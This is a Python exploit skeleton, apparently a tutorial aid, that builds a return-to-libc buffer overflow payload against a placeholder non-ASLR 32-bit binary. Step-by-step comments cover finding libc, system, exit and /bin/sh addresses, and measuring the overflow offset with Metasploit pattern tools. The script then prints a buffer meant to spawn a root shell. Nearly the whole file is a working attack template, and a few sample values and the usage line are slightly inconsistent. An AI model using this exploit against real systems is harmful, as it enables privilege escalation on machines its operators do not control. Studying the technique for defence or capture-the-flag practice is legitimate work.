#!/usr/bin/python

''' 
Buffer overflow skeleton for Non-ASLR binary exploitation using return to libc method

Author: Raul Bringas
Credits: IppSec's great work and videos for helping me understand and write this exploit


Replace ./binary-file with the name of the binary you are trying to exploit
Usage: ./binary-file 'python r4mzi.py' 
'''

import struct

'''
1)  Determine the address of libc within the vulnerable binary
    NOTE: If the address of libc continues to change ASLR is enabled...
    In this case this script will not work as is

    ldd ./binary-file | grep libc
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
'''

# Replace the value below with the address returned by the ldd command above
libc_base_addr = 0xb7e19000


'''
2)  Determine the system & exit offset address
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 
    1457: 0014ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
'''

# Replace the values below with the address returned by the readelf command above
system_offset = 0x0014ada0
exit_offset = 0x0002e9d0

'''
3)  Determine the address if /bin/sh in the vulnerable library
    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
    15bc0b /bin/sh
'''

# Replace the value below with the address returned by the strings command above
arg_offset = 0x0015bc0b

'''
4)  Calculate the system, exit, and argument values to store in the buffer
    These values will be appended to the buffer in the next step to perform the overflow
'''

system_addr = struct.pack("<I",libc_base_addr+system_offset)
exit_addr = struct.pack("<I",libc_base_addr+exit_offset)
arg_addr = struct.pack("<I",libc_base_addr+arg_offset)


'''
5)  Find how many characters are needed to overrun the buffer and gain control to EIP

    Create a 100 Character non-repeating string pattern to test overflow
    NOTE: If necessary increase the string size

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

    Run gdb on your binary and pass the string to find the overflow point
    gdb ./binary-file

    Run with random string as input in the gdb console
    gdb$ r 12edb21ud2decbweocb20c20c020ucb2bclebcljb9c29dg823gdu2bf924g024gc

    Identify overflow address using gdb output
    0x62413762 in ?? ()

    Find the character offset using the address provided by gdb
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 62413762
    [*] Exact match at offset 52
'''

# Setup the buffer with the exact amount of characters needed to create a buffer overrun
buf = "A" * 52

# Append the System address, exit address, and instruction address to execute /bin/sh as root
buf += system_addr
buf += exit_addr
buf += arg_addr

# Print the contents of the buffer to perform the overflow
print buf
